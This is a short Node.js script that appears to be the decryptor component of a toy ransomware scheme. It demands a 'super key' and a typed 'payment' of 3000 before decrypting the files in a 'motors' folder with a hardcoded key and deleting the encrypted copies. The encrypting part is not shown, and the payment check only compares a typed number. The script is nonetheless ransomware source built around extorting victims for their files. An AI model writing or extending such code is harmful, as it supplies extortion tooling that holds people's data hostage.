var encryptor = require('file-encryptor');
var fs = require('fs');
var readline = require('readline');
var path = require('path');

var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter the super key: ', function(superKey) {
  if (superKey === 'maniscan') {
    rl.question('Payment required: 3000. Enter payment amount: ', function(paymentAmount) {
      if (parseFloat(paymentAmount) === 3000) {
        decryptFiles();
      } else {
        console.error('Incorrect payment amount. Decryption aborted.');
        rl.close();
      }
    });
  } else {
    console.error('Incorrect super key. Decryption aborted.');
    rl.close();
  }
});

function decryptFiles() {
  var key = 'maniscan';
  var folderPath = 'motors';

  fs.readdir(folderPath, function(err, files) {
    if (err) {
      console.error('Error reading folder:', err);
      rl.close();
      return;
    }

    files.forEach(function(file) {
      var encryptedFilePath = path.join(folderPath, file);
      var decryptedFileName = file.replace('encrypted_', '');
      var decryptedFilePath = path.join(folderPath, 'decrypted_' + decryptedFileName);

      encryptor.decryptFile(encryptedFilePath, decryptedFilePath, key, function(err) {
        if (err) {
          console.error('Decryption error for file', file, ':', err);
        } else {
          console.log('Decryption complete for file', file);

          fs.unlink(encryptedFilePath, function(err) {
            if (err) {
              console.error('Error deleting encrypted file', file, ':', err);
            } else {
              console.log('Encrypted file', file, 'deleted.');
            }
          });

          fs.rename(decryptedFilePath, path.join(folderPath, decryptedFileName), function(err) {
            if (err) {
              console.error('Error recovering original file name for', file, ':', err);
            } else {
              console.log('Original file name recovered for file', file);
            }
          });
        }
      });
    });

    rl.close();
  });
}
